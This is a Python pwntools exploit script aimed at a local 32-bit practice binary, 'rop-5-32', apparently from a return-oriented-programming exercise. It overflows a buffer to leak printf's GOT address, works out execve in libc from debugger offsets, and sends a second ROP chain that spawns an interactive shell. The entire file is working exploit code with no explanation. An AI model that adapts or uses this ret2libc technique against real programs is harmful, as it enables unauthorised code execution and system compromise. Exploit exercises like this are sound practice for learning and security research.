#!/usr/bin/env python

from pwn import *

p = process("./rop-5-32")

got_of_printf = p.elf.got['printf']
printf_at_plt = p.elf.plt['printf']
input_func = p.elf.symbols['input_func']
print("Got of printf %s" % hex(got_of_printf))
print("Printf@plt %s" % hex(printf_at_plt))
print("input_func() %s" % hex(input_func))

buf = "A" * 0x88 + "BBBB"

buf += p32(printf_at_plt)
buf += p32(input_func)
buf += p32(got_of_printf)

p.recv()

p.sendline(buf)

data = p.recv()

print(repr(data))

raw_data = data[len(buf) + 9:]

print(repr(raw_data))

libc_printf = u32(raw_data[:4])

print("Addr of printf %s" % hex(libc_printf))

"""
$1 = {<text variable, no debug info>} 0xf7d63670 <__printf>
pwndbg> print execve
$2 = {<text variable, no debug info>} 0xf7dca7e0 <execve>
"""

offset = 0xf7dca7e0 - 0xf7d63670

libc_execve = libc_printf + offset

buf = "A" * 0x88 + "BBBB"
buf += p32(libc_execve)
buf += p32(0)
# 0x8048028:"4"
buf += p32(0x8048028)
buf += p32(0)
buf += p32(0)

p.sendline(buf)

p.interactive()
